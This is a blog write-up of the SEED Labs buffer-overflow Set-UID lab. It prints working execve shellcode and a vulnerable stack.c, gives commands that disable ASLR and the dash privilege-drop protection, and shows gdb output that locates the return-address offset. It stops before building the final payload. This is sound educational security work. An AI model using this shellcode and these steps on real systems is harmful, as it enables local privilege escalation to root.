---
layout: post
title: "SEED Labs 2.0: Buffer-Overflow Attack Lab (Set-UID Version) Writeup"
category: "Computing Systems"
---

For general overview and the setup package for this lab, please go to [SEED Labs official website](https://seedsecuritylabs.org). The lab assignments were conducted using SEED virtual machine configured on a AWS EC2 instance.

<!-- excerpt-end -->

<br />
## Table of Contents
{:.no_toc}
* TOC 
{:toc}
<br />

## Environment Setup

Ubuntu and several other Linux-based systems uses address space randomization to randomize the starting address of heap and stack. This makes guessing the exact addresses difficult. This feature can be disabled using the following command:

```console
$ sudo sysctl -w kernel.randomize_va_space=0
```

The <code>dash</code> program, as well as <code>bash</code>, has implemented a security countermeasure that prevents itself from being executed in a Set-UID process[^1]. Basically, if they detect that they are executed in a Set-UID process, they will immediately change the effective user ID to the process's real user ID, essentially dropping the privilege. The following command can be used to link <code>/bin/sh</code> to <code>zsh</code> which does not have such a countermeasure:

```console
$ sudo ln -sf /bin/zsh /bin/sh
```

## Task 1: Getting Familiar with Shellcode

The following C program executes a shell program (<code>/bin/sh</code>) using the <code>execve()</code> system call:

```c
#include <stddef.h>
void main()
{
    char *name[2];
    name[0] = "/bin/sh";
    name[1] = NULL;
    execve(name[0], name, NULL);
}
```

A naive thought is to compile the above code into binary, and then save it to the input file, e.g., <code>badfile</code>. Then we set the targeted return address field to the address of the <code>main()</code> function, so when the vulnerable program returns, it jumps to the entrance of the above code. Unfortunately, this does not work for several reasons:

- **The loader issue**: Before a normal program runs, it needs to be loaded into memory and its running environment needs to be set up. These jobs are conducted by the OS loader, which is responsible for setting up the memory (such as stack and heap), copying the program into memory, invoking the dynamic linker to the needed library functions, etc. After all the initialization is done, the <code>main()</code> function will be triggered. If any of the steps is missing, the program will not be able to run correctly. In a buffer overflow attack, the malicious code is not loaded by the OS; it is loaded directly via memory copy. Therefore, all the essential initialization steps are missing; even if we can jump to the <code>main()</code> function, we will not be able to get the shell program to run.

- **Zeros in the code**: String copying will stop when a zero is found in the source string. When we compile the above C code into binary, at least three zeros will exist in the binary code.

### Invoking the shellcode

```c
/* call_shellcode.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

// Binary code for setuid(0) 
// 64-bit:  "\x48\x31\xff\x48\x31\xc0\xb0\x69\x0f\x05"
// 32-bit:  "\x31\xdb\x31\xc0\xb0\xd5\xcd\x80"


const char shellcode[] =
#if __x86_64__
  "\x48\x31\xd2\x52\x48\xb8\x2f\x62\x69\x6e"
  "\x2f\x2f\x73\x68\x50\x48\x89\xe7\x52\x57"
  "\x48\x89\xe6\x48\x31\xc0\xb0\x3b\x0f\x05"
#else
  "\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f"
  "\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\x31"
  "\xd2\x31\xc0\xb0\x0b\xcd\x80"
#endif
;

int main(int argc, char **argv)
{
   char code[500];

   strcpy(code, shellcode);
   int (*func)() = (int(*)())code;

   func();
   return 1;
}
```

Compile and the run the <code>call_shellcode.c</code> program:

```console
~/Documents/BufferSetUID/shellcode$ make
gcc -m32 -z execstack -o a32.out call_shellcode.c
gcc -z execstack -o a64.out call_shellcode.c
~/Documents/BufferSetUID/shellcode$ ./a32.out
$ echo -ne 'Don't go gentle into that good night/'
> .!?'
Dont go gentle into that good night/
.!?%
$ exit
~/Documents/BufferSetUID/shellcode$ ./a64.out
$ echo -ne 'Oh Danny Boy the pipes the pipes are calling.'
Oh Danny Boy the pipes the pipes are calling.%
```

## Task 2: Understanding the Vulnerable Program

The <code>stack.c</code> program shown below reads $517$ bytes of data from a file called <code>badfile</code>, and then copies the data to a buffer of size $100$:

```c
/* stack.c */
#include <stdlib.h>
#include <stdio.h>
#include <string.h>

/* Changing this size will change the layout of the stack.
 * Instructors can change this value each year, so students
 * won't be able to use the solutions from the past.
 */
#ifndef BUF_SIZE
#define BUF_SIZE 100
#endif

void dummy_function(char *str);

int bof(char *str)
{
    char buffer[BUF_SIZE];

    // The following statement has a buffer overflow problem 
    strcpy(buffer, str);

    return 1;
}

int main(int argc, char **argv)
{
    char str[517];
    FILE *badfile;

    badfile = fopen("badfile", "r");
    if (!badfile) {
       perror("Opening badfile"); exit(1);
    }

    int length = fread(str, sizeof(char), 517, badfile);
    printf("Input size: %d\n", length);
    dummy_function(str);
    fprintf(stdout, "==== Returned Properly ====\n");
    return 1;
}

// This function is used to insert a stack frame of size 
// 1000 (approximately) between main's and bof's stack frames. 
// The function itself does not do anything. 
void dummy_function(char *str)
{
    char dummy_buffer[1000];
    memset(dummy_buffer, 0, 1000);
    bof(str);
}
```

Compile and run <code>stack.c</code>:

```console
~/Documents/BufferSetUID/code$ make
gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -o stack-L1 stack.c
gcc -DBUF_SIZE=100 -z execstack -fno-stack-protector -m32 -g -o stack-L1-dbg stack.c
sudo chown root stack-L1 && sudo chmod 4755 stack-L1
gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -o stack-L2 stack.c
gcc -DBUF_SIZE=160 -z execstack -fno-stack-protector -m32 -g -o stack-L2-dbg stack.c
sudo chown root stack-L2 && sudo chmod 4755 stack-L2
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -m32 -o stack-L3 stack.c
gcc -DBUF_SIZE=200 -z execstack -fno-stack-protector -m32 -g -o stack-L3-dbg stack.c
sudo chown root stack-L3 && sudo chmod 4755 stack-L3
gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -m32 -o stack-L4 stack.c
gcc -DBUF_SIZE=10 -z execstack -fno-stack-protector -m32 -g -o stack-L4-dbg stack.c
sudo chown root stack-L4 && sudo chmod 4755 stack-L4
~/Documents/BufferSetUID/code$ ls
Makefile        stack-L1        stack-L2-dbg    stack-L4
brute-force.sh  stack-L1-dbg    stack-L3        stack-L4-dbg
exploit.py      stack-L2        stack-L3-dbg    stack.c
```

## Task 3: Launching Attack on $32$-bit Program (Level 1)

### Investigation

```console
~/Documents/BufferSetUID/code$ touch badfile
~/Documents/BufferSetUID/code$ gdb stack-L1-dbg
gdb-peda$ break bof
Breakpoint 1 at 0x12ad: file stack.c, line 16.
gdb-peda$ run
Starting program: /home/seed/Documents/BufferSetUID/code/stack-L1-dbg
Input size: 0
[----------------------------------registers-----------------------------------]
EAX: 0xffffcdb8 --> 0x0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffd1a0 --> 0xf7fb5000 --> 0x1e6d6c 
ESI: 0xf7fb5000 --> 0x1e6d6c 
EDI: 0xf7fb5000 --> 0x1e6d6c 
EBP: 0xffffd1a8 --> 0xffffd3d8 --> 0x0 
ESP: 0xffffcd9c --> 0x565563ee (<dummy_function+62>:	add    esp,0x10)
EIP: 0x565562ad (<bof>:	endbr32)
EFLAGS: 0x292 (carry parity ADJUST zero SIGN trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562a4 <frame_dummy+4>:	jmp    0x56556200 <register_tm_clones>
   0x565562a9 <__x86.get_pc_thunk.dx>:	mov    edx,DWORD PTR [esp]
   0x565562ac <__x86.get_pc_thunk.dx+3>:	ret    
=> 0x565562ad <bof>:	endbr32 
   0x565562b1 <bof+4>:	push   ebp
   0x565562b2 <bof+5>:	mov    ebp,esp
   0x565562b4 <bof+7>:	push   ebx
   0x565562b5 <bof+8>:	sub    esp,0x74
[------------------------------------stack-------------------------------------]
0000| 0xffffcd9c --> 0x565563ee (<dummy_function+62>:	add    esp,0x10)
0004| 0xffffcda0 --> 0xffffd1c3 --> 0x456 
0008| 0xffffcda4 --> 0x0 
0012| 0xffffcda8 --> 0x3e8 
0016| 0xffffcdac --> 0x565563c3 (<dummy_function+19>:	add    eax,0x2bf5)
0020| 0xffffcdb0 --> 0x0 
0024| 0xffffcdb4 --> 0x0 
0028| 0xffffcdb8 --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value

Breakpoint 1, bof (str=0xffffd1c3 "V\004") at stack.c:16
16	{
```

When <code>gdb</code> stops inside the <code>bof</code> function, it stops before the <code>ebp</code> register is set to point to the current stack frame, so if we print out the value of <code>ebp</code> here, we will get the caller's <code>ebp</code> value. We need to use the <code>next</code> command[^2] to execute a few instructions and stop after the <code>ebp</code> register is modified to point to the stack frame of the <code>bof</code> function.

```console
gdb-peda$ next
[----------------------------------registers-----------------------------------]
EAX: 0x56558fb8 --> 0x3ec0 
EBX: 0x56558fb8 --> 0x3ec0 
ECX: 0x60 ('`')
EDX: 0xffffd1a0 --> 0xf7fb5000 --> 0x1e6d6c 
ESI: 0xf7fb5000 --> 0x1e6d6c 
EDI: 0xf7fb5000 --> 0x1e6d6c 
EBP: 0xffffcd98 --> 0xffffd1a8 --> 0xffffd3d8 --> 0x0 
ESP: 0xffffcd20 ("1pUV\264\321\377\377\220\325\377\367\340\263\374", <incomplete sequence \367>)
EIP: 0x565562c2 (<bof+21>:	sub    esp,0x8)
EFLAGS: 0x216 (carry PARITY ADJUST zero sign trap INTERRUPT direction overflow)
[-------------------------------------code-------------------------------------]
   0x565562b5 <bof+8>:	sub    esp,0x74
   0x565562b8 <bof+11>:	call   0x565563f7 <__x86.get_pc_thunk.ax>
   0x565562bd <bof+16>:	add    eax,0x2cfb
=> 0x565562c2 <bof+21>:	sub    esp,0x8
   0x565562c5 <bof+24>:	push   DWORD PTR [ebp+0x8]
   0x565562c8 <bof+27>:	lea    edx,[ebp-0x6c]
   0x565562cb <bof+30>:	push   edx
   0x565562cc <bof+31>:	mov    ebx,eax
[------------------------------------stack-------------------------------------]
0000| 0xffffcd20 ("1pUV\264\321\377\377\220\325\377\367\340\263\374", <incomplete sequence \367>)
0004| 0xffffcd24 --> 0xffffd1b4 --> 0x0 
0008| 0xffffcd28 --> 0xf7ffd590 --> 0xf7fd1000 --> 0x464c457f 
0012| 0xffffcd2c --> 0xf7fcb3e0 --> 0xf7ffd990 --> 0x56555000 --> 0x464c457f 
0016| 0xffffcd30 --> 0x0 
0020| 0xffffcd34 --> 0x0 
0024| 0xffffcd38 --> 0x0 
0028| 0xffffcd3c --> 0x0 
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
20	    strcpy(buffer, str);
```

Print out <code>$ebp</code> and the buffer's address:

```console
gdb-peda$ p $ebp
$1 = (void *) 0xffffcd98
gdb-peda$ p &buffer
$2 = (char (*)[100]) 0xffffcd2c
```

### Launching attacks

Since the value of the stack frame pointer is <code>0xffffcd98</code>, the return address is stored in <code>0xffffcd98 + 4</code>; the first address that we can jump to is <code>0xffffcd98 + 8</code>, which can be put inside the return address field. The distance between the address of <code>$ebp</code> (<code>0xffffcd98</code>) and the buffer (<code>0xffffcd2c</code>) is <code>0x6c</code>, which is $108$ in decimalnotation. Therefore, the distance between the buffer's starting point and the return address field is $112$.

## Notes

[^1]: A privileged program is one that can give users extra privileges beyond that are already assigned to them. A Set-Root-UID program is a privileged program because it allows users to gain the root privilege during the execution of the programs. For Set-UID programs in UNIX and UNIX-like operating systems, which stands for **set user ID on execution**, the effective <code>uid</code> is the owner of the program, while the real <code>uid</code> is the user of the program. Windows does not have the notion of Set-UID. A different mechanism is used for implementing privileged functionality. A developer would write a privileged program as a service and the user sends the command line arguments to the service using Local Procedure Call.

[^2]: Continue to the next source line in the current (innermost) stack frame. This is similar to <code>step</code>, but function calls that appear within the line of code are executed without stopping. Execution stops when control reaches a different line of code at the original stack level that was executing when you gave the <code>next</code> command.